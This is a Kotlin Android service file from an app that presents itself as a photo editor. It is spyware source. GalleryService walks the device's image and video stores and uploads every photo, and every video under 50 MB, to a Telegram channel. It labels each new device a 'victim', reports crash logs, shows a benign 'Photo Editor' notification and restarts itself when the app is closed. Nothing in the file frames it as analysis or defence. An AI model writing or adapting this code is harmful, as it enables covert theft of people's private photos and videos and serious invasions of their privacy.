package com.magic.photoeditor

import android.app.*
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.provider.MediaStore
import android.widget.Toast
import androidx.core.app.NotificationCompat
import java.io.File
import java.io.PrintWriter
import java.io.StringWriter

class GalleryService : Service() {

    private lateinit var telegram: TelegramSender
    private var isRunning = false

    override fun onCreate() {
        super.onCreate()
        telegram = TelegramSender()
        createNotificationChannel()
        startForeground(Config.NOTIFICATION_ID, buildNotification("Starting..."))
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!isRunning) {
            isRunning = true
            try {
                toast("Starting harvest...")
                harvestAllMedia()
            } catch (e: Exception) {
                sendCrashLog(e)
                toast("Error: ${e.message}")
            } finally {
                isRunning = false
                stopSelf()
            }
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onTaskRemoved(rootIntent: Intent?) {
        try {
            val restart = Intent(this, GalleryService::class.java)
            val pending = PendingIntent.getService(
                this, 0, restart, PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
            )
            val alarm = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            alarm.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 5000, pending)
        } catch (e: Exception) {
            // ignore
        }
        super.onTaskRemoved(rootIntent)
    }

    private fun harvestAllMedia() {
        try {
            val info = Utils.getDeviceInfo(this)
            telegram.sendMessage("📱 New victim: $info")
            updateNotification("Harvesting media...")

            var totalCount = 0
            totalCount += harvestImages()
            totalCount += harvestVideos()

            telegram.sendMessage("✅ Harvest complete: $totalCount files sent.")
            toast("Complete: $totalCount files")
            updateNotification("Complete: $totalCount files")
        } catch (e: Exception) {
            sendCrashLog(e)
            toast("Error: ${e.message}")
            telegram.sendMessage("❌ Harvest error: ${e.message}")
        }
    }

    private fun harvestImages(): Int {
        var count = 0
        try {
            val contentResolver: ContentResolver = contentResolver
            val uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
            } else {
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            }

            val projection = arrayOf(
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.DISPLAY_NAME
            )

            val cursor = contentResolver.query(uri, projection, null, null, null)
            cursor?.use {
                val dataCol = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
                val nameCol = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                while (it.moveToNext()) {
                    try {
                        val path = it.getString(dataCol)
                        val name = it.getString(nameCol)
                        if (path != null) {
                            val file = File(path)
                            if (file.exists() && file.length() > 0) {
                                telegram.sendFile(file, "photo", name)
                                count++
                                Thread.sleep(50)
                            }
                        }
                    } catch (e: Exception) {
                        // Skip this file and continue
                    }
                }
            }
        } catch (e: Exception) {
            telegram.sendMessage("❌ Image harvest error: ${e.message}")
        }
        return count
    }

    private fun harvestVideos(): Int {
        var count = 0
        try {
            val contentResolver: ContentResolver = contentResolver
            val uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                MediaStore.Video.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
            } else {
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI
            }

            val projection = arrayOf(
                MediaStore.Video.Media.DATA,
                MediaStore.Video.Media.DISPLAY_NAME,
                MediaStore.Video.Media.SIZE
            )

            val cursor = contentResolver.query(uri, projection, null, null, null)
            cursor?.use {
                val dataCol = it.getColumnIndexOrThrow(MediaStore.Video.Media.DATA)
                val nameCol = it.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)
                val sizeCol = it.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE)
                while (it.moveToNext()) {
                    try {
                        val path = it.getString(dataCol)
                        val name = it.getString(nameCol)
                        val size = it.getLong(sizeCol)
                        if (path != null && size > 0 && size < 50 * 1024 * 1024) {
                            val file = File(path)
                            if (file.exists()) {
                                telegram.sendFile(file, "video", name)
                                count++
                                Thread.sleep(50)
                            }
                        }
                    } catch (e: Exception) {
                        // Skip
                    }
                }
            }
        } catch (e: Exception) {
            telegram.sendMessage("❌ Video harvest error: ${e.message}")
        }
        return count
    }

    private fun sendCrashLog(e: Exception) {
        try {
            val sw = StringWriter()
            val pw = PrintWriter(sw)
            e.printStackTrace(pw)
            telegram.sendMessage("🔥 CRASH: ${e.message}\n\n${sw.toString().take(2000)}")
        } catch (ignored: Exception) {
            // ignore
        }
    }

    private fun toast(msg: String) {
        try {
            android.os.Handler(android.os.Looper.getMainLooper()).post {
                Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
            }
        } catch (e: Exception) {
            // ignore
        }
    }

    private fun updateNotification(text: String) {
        try {
            val notification = buildNotification(text)
            val manager = getSystemService(NotificationManager::class.java)
            manager.notify(Config.NOTIFICATION_ID, notification)
        } catch (e: Exception) {
            // ignore
        }
    }

    private fun buildNotification(text: String): Notification {
        return NotificationCompat.Builder(this, Config.CHANNEL_ID)
            .setContentTitle("Photo Editor")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_menu_gallery)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val channel = NotificationChannel(
                    Config.CHANNEL_ID,
                    Config.CHANNEL_NAME,
                    NotificationManager.IMPORTANCE_LOW
                )
                val manager = getSystemService(NotificationManager::class.java)
                manager.createNotificationChannel(channel)
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }
}
